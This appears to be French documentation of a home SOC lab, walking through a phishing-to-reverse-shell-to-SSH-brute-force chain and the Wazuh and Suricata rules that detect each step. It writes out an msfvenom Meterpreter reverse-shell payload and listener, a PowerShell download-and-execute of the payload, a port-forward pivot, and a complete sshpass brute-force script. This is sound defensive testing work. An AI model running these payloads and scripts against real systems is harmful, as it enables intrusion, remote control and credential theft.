# Scénario d'attaque

Scénario testé et validé de bout en bout : phishing → reverse shell → mouvement latéral → brute force SSH. Chaque étape est détectée par la chaîne de détection (voir [detection.md](detection.md)) et déclenche, pour les deux premières, une réponse active automatique (voir [reponse-active.md](reponse-active.md)).

## Simplification volontaire du lab

Windows Defender est désactivé sur Windows 10 avant l'exécution du payload. Ce n'est pas un contournement réaliste d'antivirus mais une simplification assumée : l'objectif du lab est de valider la chaîne détection/réponse côté SOC (Wazuh, Suricata), pas de démontrer une technique d'évasion AV. La détection décrite plus bas (téléchargement et exécution du payload) fonctionne indépendamment de Defender, via Sysmon/PowerShell logging.

## 1. Préparation du payload (Kali)

Génération d'un payload Meterpreter reverse TCP avec `msfvenom` :

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.208.130 LPORT=4444 -f exe -o /tmp/phishing.exe
```

Mise en écoute du listener correspondant :

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.208.130
set LPORT 4444
run
```

Hébergement du payload via un serveur Apache local, simulant le lien de phishing :

```bash
sudo cp /tmp/phishing.exe /var/www/html/
sudo systemctl start apache2
sudo systemctl status apache2
ls -lh /var/www/html/phishing.exe
```

## 2. Livraison et exécution (Windows 10)

Depuis PowerShell sur le poste victime, téléchargement puis exécution du payload :

```powershell
# Téléchargement du payload
Invoke-WebRequest -Uri "http://192.168.208.130/phishing.exe" -OutFile "C:\Users\tbara\Desktop\phishing.exe"

# Exécution du payload
"C:\Users\tbara\Desktop\phishing.exe"
```

Le téléchargement et l'exécution sont tous deux détectés par Wazuh (règle custom 100501, Sysmon/PowerShell Event 4104), indépendamment de l'état de Defender.

## 3. Reverse shell (Kali)

L'exécution du payload ouvre une session Meterpreter sur Kali, via la connexion sortante autorisée vers le port 4444. Cette étape est détectée par deux mécanismes indépendants :

- Wazuh, règle custom 100201 (Sysmon Event 3, port destination 4444)
- Suricata, signature ET Open native "Possible Metasploit Payload Common Construct Bind_API" (SID 2025644)

## 4. Découverte de Metasploitable2 (mouvement latéral)

Depuis la session Meterpreter, consultation de l'historique de connexions SSH régulières sur Windows pour simuler la découverte d'un hôte cible :

```
cat C:\Users\tbara\.ssh\known_hosts
```

## 5. Scan ciblé du port SSH

Depuis un shell système ouvert dans la session Meterpreter, confirmation que le port 22 de Metasploitable2 (192.168.20.10) est accessible :

```
shell
powershell Test-NetConnection -ComputerName 192.168.20.10 -Port 22
```

Pas de scan large : le pare-feu pfSense le bloquerait (LAN-UTILISATEURS → LAN-SERVEURS bloqué par défaut, seule l'exception SSH 192.168.30.10 → 192.168.20.10:22 est autorisée, voir [architecture.md](architecture.md)).

## 6. Pivot vers Metasploitable2

Redirection d'un port local de Kali vers le port 22 de Metasploitable2, via la session Meterpreter :

```
portfwd add -l 2222 -p 22 -r 192.168.20.10
```

## 7. Brute force SSH

Script bash utilisant `sshpass`, ciblant `127.0.0.1:2222` (redirigé vers Metasploitable2 via le portfwd) :

```bash
#!/usr/bin/env bash
while read -r pass; do
  [[ -z "$pass" ]] && continue
  echo -n "[$(date +%T)] Test : $pass ... "
  result=$(timeout 15 sshpass -p "$pass" ssh -n -p 2222 \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=10 \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o "PubkeyAcceptedAlgorithms=+ssh-rsa" \
    -o "HostKeyAlgorithms=+ssh-rsa" \
    -o "KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1" \
    msfadmin@127.0.0.1 "echo CONNEXION_REUSSIE" 2>/dev/null)
  if echo "$result" | grep -q "CONNEXION_REUSSIE"; then
    echo "TROUVE"
    echo ">>> MOT DE PASSE : $pass"
    break
  else
    echo "échec (ou timeout)"
  fi
  sleep 2
done < passwords.txt
```

Hydra et le module Metasploit `ssh_login` ont été abandonnés : incompatibles avec la version legacy d'OpenSSH (4.7p1) de Metasploitable2. Les options SSH ci-dessus (`PubkeyAcceptedAlgorithms`, `HostKeyAlgorithms`, `KexAlgorithms`) forcent la compatibilité avec les algorithmes obsolètes de cette version.

Le `timeout 15` et le `sleep 2` entre tentatives corrigent un bug de blocage intermittent : `ConnectTimeout` ne borne que l'établissement TCP, pas toute la négociation SSH à travers le tunnel `portfwd` (limite connue de `portfwd` sous trafic répété).

Identifiants trouvés : `msfadmin` / `msfadmin` (identifiants par défaut de Metasploitable2, jamais changés).

Cette étape est détectée par Wazuh (règle custom 100502, voir [detection.md](detection.md)).

## 8. Connexion avec les identifiants trouvés

Une fois le mot de passe identifié par le script de brute force, connexion SSH interactive à Metasploitable2 avec les mêmes options de compatibilité algorithmique :

```bash
ssh -p 2222 -o "PubkeyAcceptedAlgorithms=+ssh-rsa" -o "HostKeyAlgorithms=+ssh-rsa" -o "KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1" msfadmin@127.0.0.1
```